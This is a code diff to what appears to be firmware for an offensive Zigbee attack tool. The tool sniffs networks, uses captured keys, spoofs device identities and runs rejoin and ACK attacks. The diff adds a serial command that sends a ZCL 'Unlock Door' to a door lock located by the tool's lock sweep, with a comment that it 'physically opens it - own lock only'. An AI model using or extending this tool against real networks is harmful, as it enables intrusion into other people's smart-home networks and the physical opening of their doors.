@@ -21,6 +21,8 @@
  *           a captured network key. P alone sweeps every known host.
  *   L[addr] find_lock: probe a host (or L alone = sweep all) for the Door
  *           Lock cluster (0x0101). Requires a join + network key.
+ *   O<addr>[,pin] unlock: send ZCL 'Unlock Door' to a lock found by find_lock
+ *           (e.g. O1A2E or O1A2E,1234).  ** physically opens it - own lock only **
  *   M<addr> Spoof our EUI64 to that of a known host (M alone restores the
  *           real hardware MAC).
  *   R<addr> insecure_rejoin attack: impersonate a host and send an unsecured
@@ -321,6 +323,14 @@ void handleSerial() {
     } else if (cmd == "L") {
         // L (no addr) - sweep all known hosts for the Door Lock cluster
         zping.findLockSweepAll();
+    } else if (cmd[0] == 'O' && cmd.length() > 1) {
+        // O<addr>[,pin] - unlock a lock found by find_lock (e.g. O1A2E or O1A2E,1234)
+        String rest = cmd.substring(1);
+        int comma = rest.indexOf(',');
+        String addrStr = (comma > 0) ? rest.substring(0, comma) : rest;
+        uint16_t addr = (uint16_t)strtol(addrStr.c_str(), nullptr, 16);
+        String pin = (comma > 0) ? rest.substring(comma + 1) : String();
+        zping.unlock(addr, pin.length() ? pin.c_str() : nullptr);
     } else if (cmd[0] == 'M' && cmd.length() > 1) {
         // M<addr> - spoof our EUI64 to that of a known host
         uint16_t addr = (uint16_t)strtol(cmd.substring(1).c_str(), nullptr, 16);
@@ -347,7 +357,7 @@ void handleSerial() {
         if (sniffer.isAckAttackActive()) zattack.stopAckAttack();
         else zattack.printAckAttackStatus();
     } else {
-        Serial.println("Commands: c<ch>  h(op)  j/J[addr](oin)  k(eys)  l(ist)  p(cap)  P[addr](ing)  L[addr]ock  M[addr]spoof  R<addr>ejoin  A[addr]ck  s(tats) (S)can H(eader) d(U)ps t<a>,<ty>,<l>  r(eset)");
+        Serial.println("Commands: c<ch>  h(op)  j/J[addr](oin)  k(eys)  l(ist)  p(cap)  P[addr](ing)  L[addr]ock  O<addr>[,pin]unlock  M[addr]spoof  R<addr>ejoin  A[addr]ck  s(tats) (S)can H(eader) d(U)ps t<a>,<ty>,<l>  r(eset)");
     }
 }
 
@@ -422,7 +432,7 @@ void setup() {
         sd.listFiles();
     }
 
-    Serial.println("Ready. Commands: c<ch>  h(op)  j/J[addr](oin)  k(eys)  K(→SD)  l(ist)  p(cap)  P[addr](ing)  L[addr]ock  M[addr]spoof  R<addr>ejoin  A[addr]ck  W(rite)  F(iles)  s(tats)");
+    Serial.println("Ready. Commands: c<ch>  h(op)  j/J[addr](oin)  k(eys)  K(→SD)  l(ist)  p(cap)  P[addr](ing)  L[addr]ock  O<addr>[,pin]unlock  M[addr]spoof  R<addr>ejoin  A[addr]ck  W(rite)  F(iles)  s(tats)");
     show_header();
 }
 
